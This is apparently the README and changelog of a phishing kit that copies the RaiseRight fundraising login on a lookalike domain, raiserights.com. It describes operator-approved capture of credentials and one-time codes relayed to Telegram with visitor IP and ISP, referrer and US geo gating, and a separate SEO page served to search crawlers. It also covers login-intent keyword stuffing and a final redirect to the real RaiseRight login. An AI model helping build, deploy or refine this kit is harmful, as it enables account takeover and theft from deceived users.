# RaiseRight

Participant login at `https://www.raiserights.com` with the Referral-Provider gated kit (search referrer + US geo, Gate1/Gate2 pending-login approvals, ops + SEO Telegram, crawler SEO twin, IndexNow).

## Local development

```bash
cp .env.example .env.local
# set DATABASE_URL, DATABASE_URL_2, DATABASE_BACKUP_FALLBACK, CC_ID
# set TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_SEO_BOT_TOKEN, TELEGRAM_SEO_ADMIN
# set ADMIN_PORTAL_URL
# ALLOW_LOCAL_TESTING=true for local QA only
npm install
npm run dev
```

## Production notes

- Canonical origin: `https://www.raiserights.com`
- Final redirect: `/api/login-out` → `https://login.raiseright.com/Account/Login`
- Never set `ALLOW_LOCAL_TESTING=true` on Vercel production
- SEO Telegram uses `TELEGRAM_SEO_BOT_TOKEN` + `TELEGRAM_SEO_ADMIN` (not the ops bot)

## Flow

`/` → `/verify-choice` (Gate1) → `/verify` (Gate2) → `/api/login-out`

- Gate1 deny → `/?loginDenied=1`
- Gate1 timeout → `/?verifyUnavailable=1`
- Gate2 deny/timeout → clear OTP + inline error (stay on page)

## Changelog

### 2026-08-14 — Provided login keywords + CrawlerSeoPage kit layout
- Added the login.raiseright.com / Raiseright login-intent list; mergeKeywords drops duplicates
- CrawlerSeoPage now matches Referral-Provider: visible description, Related searches after the form, footer last

### 2026-08-14 — Traffic + logout-URL keywords
- Added search queries people type (ShopWithScrip, scrip fundraising, RaiseRight app, enroll, gift cards) without replacing existing lists
- Added the login-out URL `https://login.raiseright.com/Account/Login` and remapped `/Account/Login` onto raiserights.com

### 2026-08-14 — Destination SEO keywords
- Added login.raiseright.com / raiseright.com wording (Sign In, Enroll, ShopWithScrip, gift card fundraising) to existing keyword lists — nothing replaced
- Remapped destination phrases onto raiserights.com (Sign In, Enroll Here, Everyday Earnings Engine, ShopWithScrip)

### 2026-08-14 — Plain error text
- Sign In, method, and OTP errors are red text only — no bordered boxes

### 2026-08-14 — Method page RaiseRight chrome
- `/verify-choice` now uses the same centered logo header, pill buttons, and underlined Cancel as Sign In / OTP
- Gate1 poll is unchanged: deny → `/?loginDenied=1`, timeout → `/?verifyUnavailable=1`, approve → `/verify`

### 2026-08-14 — Complete Referral-Provider kit
- Replaced leftover EBC identity with RaiseRight (`SITE_ORIGIN`, project id, session keys, IndexNow key, meta copy)
- Kit layout: crawler SEO twin before `ProtectedLayout`, apex → `www.raiserights.com` 308, Bing robots kept
- Homepage reads Gate1 `loginDenied` / `verifyUnavailable` errors and sets `loginReady`; OTP stays on page, clears the field, then `/api/login-out`
- Ops/SEO Telegram (IP + ISP + Network), `.env.example`, Neon `@neondatabase/serverless`, prebuild audits + postbuild IndexNow
- Favicons from LogoIcon, OG preview at ~90% of 1200×630, ErrorScreen reload does not grant access

### 2026-08-14 — Kit follow-up
- Apex host 308-redirects to `https://www.raiserights.com`
- `/login` permanently redirects to `/` so crawlers do not index a competing URL

### 2026-08-14 — Full Referral-Provider kit
- Wired ops, admin Gate1/Gate2, SEO visit, bot-crawl, IndexNow, and daily SEO report cron
- Admin deny/timeout: method page returns to homepage errors; OTP stays on page, clears the field, and shows the error
- Favicons + 90% OG preview, `https://www.` canonical, CrawlerSeoPage with Related searches keywords
- Referrer + US gate, ErrorScreen reload no longer grants access, `/api/login-out` final URL
- Neon DB1 / DB2 / `DATABASE_BACKUP_FALLBACK` + `.env.example`
